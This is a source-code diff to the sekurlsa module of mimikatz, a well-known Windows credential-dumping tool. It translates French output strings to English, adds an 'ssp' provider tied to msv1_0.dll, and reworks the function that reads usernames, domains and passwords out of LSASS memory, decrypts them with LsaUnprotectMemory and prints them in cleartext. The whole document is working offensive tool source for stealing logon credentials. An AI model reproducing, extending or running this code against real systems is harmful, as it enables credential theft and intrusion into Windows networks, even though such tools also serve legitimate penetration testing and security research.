@@ -54,12 +54,13 @@ LONG OFFS_WIN8_InitializationVector					= sizeof(PTRN_WIN8_LsaInitializeProtecte
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_msv1_0::getMSV,		L"msv",		L"énumère les sessions courantes du provider MSV1_0"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_wdigest::getWDigest,	L"wdigest",	L"énumère les sessions courantes du provider WDigest"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_kerberos::getKerberos,	L"kerberos",L"énumère les sessions courantes du provider Kerberos"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_tspkg::getTsPkg,		L"tspkg",	L"énumère les sessions courantes du provider TsPkg"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"énumère les sessions courantes du provider LiveSSP"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"énumère les sessions courantes des providers disponibles"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_msv1_0::getMSV,		L"msv",		L"lists the current sessions of the provider MSV1_0"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_wdigest::getWDigest,	L"wdigest",	L"lists the current sessions of the provider WDigest"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_kerberos::getKerberos,	L"kerberos",L"lists the current sessions of the provider Kerberos"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_tspkg::getTsPkg,		L"tspkg",	L"lists the current sessions of the provider TsPkg"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"lists the current sessions of the provider LiveSSP"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_ssp::getSSP,	L"ssp",	L"lists the current sessions of the provider SSP (msv1_0)"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"lists the current sessions of the available provider(s)"));
 	return monVector;
 }
 
@@ -68,7 +69,7 @@ bool mod_mimikatz_sekurlsa::getLogonPasswords(vector<wstring> * arguments)
 	if(searchLSASSDatas())
 		getLogonData(arguments, &GLOB_ALL_Providers);
 	else
-		wcout << L"Données LSASS en erreur" << endl;
+		wcout << L"LSASS error in data" << endl;
 	return true;
 }
 
@@ -93,6 +94,8 @@ bool mod_mimikatz_sekurlsa::unloadLsaSrv()
 		delete mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
 	if(mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
 		delete mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
+	if(mod_mimikatz_sekurlsa_ssp::pModMSV)
+		delete mod_mimikatz_sekurlsa_ssp::pModMSV;
 
 	if(g_pRandomKey)
 		if(*g_pRandomKey)
@@ -156,6 +159,11 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 							{
 								lePointeur = &mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
 								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData, wstring(L"kerberos")));
+							}
+							else if((_wcsicmp(leModule->szModule.c_str(), L"msv1_0.dll") == 0) && !mod_mimikatz_sekurlsa_ssp::pModMSV)
+							{
+								lePointeur = &mod_mimikatz_sekurlsa_ssp::pModMSV;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_ssp::getSSPLogonData, wstring(L"ssp")));
 							}
 
 							if(lePointeur)
@@ -425,21 +433,39 @@ PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsig
 	return resultat;
 }
 
-void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg)
+void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst, PDWORD pos)
 {
 	if(mesCreds)
 	{
-		wstring password = mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);//getUnicodeString(&mesCreds->Password, true);
-		if(justSecurity)
-			wcout << password;
-		else
+		if(mesCreds->Password.Buffer || mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer)
 		{
-			wstring userName = mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
-			wstring domainName = mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
-			wcout << endl <<
-				L"\t * Utilisateur  : " << (isTsPkg ? domainName : userName) << endl <<
-				L"\t * Domaine      : " << (isTsPkg ? userName : domainName) << endl <<
-				L"\t * Mot de passe : " << password;
+			wstring userName	= mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
+			wstring domainName	= mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
+			wstring password	= mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);
+			wstring rUserName	= (isDomainFirst ? domainName : userName);
+			wstring rDomainName	= (isDomainFirst ? userName : domainName);
+
+			if(justSecurity)
+			{
+				if(!pos)
+					wcout << password;
+				else
+					wcout << endl <<
+						L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
+			}
+			else
+			{
+				if(!pos)
+					wcout << endl <<
+						L"\t * User        : " << rUserName << endl <<
+						L"\t * Domain      : " << rDomainName << endl <<
+						L"\t * Password    : " << password;
+				else
+					wcout << endl <<
+						L"\t * [" << *pos  << L"] User        : " << rUserName << endl <<
+						L"\t       Domain      : " << rDomainName << endl <<
+						L"\t       Password    : " << password;
+			}
 		}
 	} else wcout << L"n.t. (LUID KO)";
 }
@@ -458,30 +484,26 @@ bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<
 			{
 				if(sessionData->LogonType != Network)
 				{
-					wstring username(sessionData->UserName.Buffer, sessionData->UserName.Length / sizeof(wchar_t));
-					wstring package(sessionData->AuthenticationPackage.Buffer, sessionData->AuthenticationPackage.Length / sizeof(wchar_t));
-					wstring domain(sessionData->LogonDomain.Buffer, sessionData->LogonDomain.Length / sizeof(wchar_t));
-
 					wcout << endl <<
-						L"Authentification Id         : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
-						L"Package d\'authentification  : " << package << endl <<
-						L"Utilisateur principal       : " << username << endl <<
-						L"Domaine d\'authentification  : " << domain << endl;
+						L"Authentication ID         : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
+						L"Authentication Package    : " << mod_text::stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
+						L"Primary user              : " << mod_text::stringOfSTRING(sessionData->UserName) << endl <<
+						L"Domain authentication     : " << mod_text::stringOfSTRING(sessionData->LogonDomain) << endl;
 
 					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
 					{
-						wcout << L'\t' << monProvider->second << L" : \t";
+						wcout << L'\t' << monProvider->second << (mesArguments->empty() ? (L" :") : (L"")) << L'\t';
 						monProvider->first(&sessions[i], mesArguments->empty());
 						wcout << endl;
 					}
 				}
 				LsaFreeReturnBuffer(sessionData);
 			}
-			else wcout << L"Erreur : Impossible d\'obtenir les données de session" << endl;
+			else wcout << L"Error: Unable to get session data" << endl;
 		}
 		LsaFreeReturnBuffer(sessions);
 	}
-	else wcout << L"Erreur : Impossible d\'énumerer les sessions courantes" << endl;
+	else wcout << L"Error: Unable to enumerate the current sessions" << endl;
 
 	return true;
 }
